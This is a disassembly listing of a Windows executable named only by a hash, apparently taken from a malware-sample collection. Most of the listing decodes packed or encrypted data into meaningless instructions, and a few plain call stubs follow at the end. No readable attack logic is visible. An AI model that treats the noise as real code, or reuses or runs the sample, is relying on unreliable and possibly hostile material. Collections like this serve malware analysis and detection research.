
7b7ef568e8844a83242473300e9e3fa6e8ffd26f5955fa611f166b3201623724.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	adc    ebp,DWORD PTR [edx-0x7a]
  4d0003:	add    eax,0x578440e4
  4d0008:	mov    al,ds:0x1940f429
  4d000d:	jnp    0x4cffc0
  4d000f:	or     BYTE PTR [ecx+0x34],bh
  4d0012:	cli    
  4d0013:	fldcw  WORD PTR ds:0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0672
  4d06c1:	sub    esp,DWORD PTR [ecx-0x2baedf06]
  4d06c7:	mov    esi,0x48e3e6d2
  4d06cc:	ins    BYTE PTR es:[edi],dx
  4d06cd:	push   esp
  4d06ce:	fs adc al,0x56
  4d06d1:	sub    esp,DWORD PTR [ebp+0x111dfd7e]
  4d06d7:	push   0x56a12d04
  4d06dc:	(bad)  [ecx]
  4d06de:	js     0x4d0740
  4d06e0:	push   eax
  4d06e1:	xor    al,0xec
  4d06e3:	mov    ds:0x7801ac3b,al
  4d06e8:	in     al,0x1b
  4d06ea:	pushf  
  4d06eb:	bound  ecx,QWORD PTR [ebx-0x1374aa01]
  4d06f1:	sub    esp,0x54
  4d06f4:	lea    edi,[esi-0x114]
  4d06fa:	mov    DWORD PTR [edi+0x198],edi
  4d0700:	push   edi
  4d0701:	push   ebx
  4d0702:	push   DWORD PTR [edi+0x18]
  4d0705:	call   0x4d0980
  4d070a:	add    esp,0x8
  4d070d:	pop    edi
  4d070e:	push   edi
  4d070f:	mov    eax,0x0
  4d0714:	push   eax
  4d0715:	call   0x4d09d4
  4d071a:	add    esp,0x4
  4d071d:	pop    edi
  4d071e:	push   edi
  4d071f:	push   0x0
  4d0721:	call   0x4d0968
  4d0726:	add    esp,0x4
  4d0729:	pop    edi
  4d072a:	add    esp,0x54
  4d072d:	pop    ebp
  4d072e:	ret    
  4d072f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0735:	sub    esp,0x2c
  4d0738:	lea    ecx,ds:0x4d3120
  4d073e:	adc    edx,esi
  4d0740:	push   ecx
  4d0741:	push   DWORD PTR [ecx+0xa8]
  4d0747:	push   eax
  4d0748:	call   0x4d1030
  4d074d:	add    esp,0x8
  4d0750:	pop    ecx
  4d0751:	push   ecx
  4d0752:	push   0xfffffff4
  4d0754:	call   0x4d0974
  4d0759:	add    esp,0x4
  4d075c:	pop    ecx
  4d075d:	push   ecx
  4d075e:	call   0x4d07fc
  4d0763:	add    esp,0x4
  4d0766:	pop    ecx
  4d0767:	add    esp,0x2c
  4d076a:	pop    ebp
  4d076b:	ret    
  4d076c:	mov    edi,edi
  4d076e:	push   ebp
  4d076f:	mov    ebp,esp
  4d0771:	sub    esp,0x40
  4d0774:	lea    ebx,ds:0x4d3088
  4d077a:	add    edx,ecx
  4d077c:	mov    esi,0x0
  4d0781:	push   esi
  4d0782:	call   0x4d127c
  4d0787:	add    esp,0x4
  4d078a:	push   ebx
  4d078b:	push   ecx
  4d078c:	push   edi
  4d078d:	call   0x4d14d0
  4d0792:	add    esp,0x8
  4d0795:	pop    ebx
  4d0796:	call   0x4d07fc
  4d079b:	add    esp,0x4
  4d079e:	add    esp,0x40
  4d07a1:	pop    ebp
  4d07a2:	ret    
  4d07a3:	add    BYTE PTR [edi-0x1],bl
  4d07a6:	adc    eax,0x4d208c
  4d07ab:	call   edi
  4d07ad:	add    BYTE PTR [eax],al
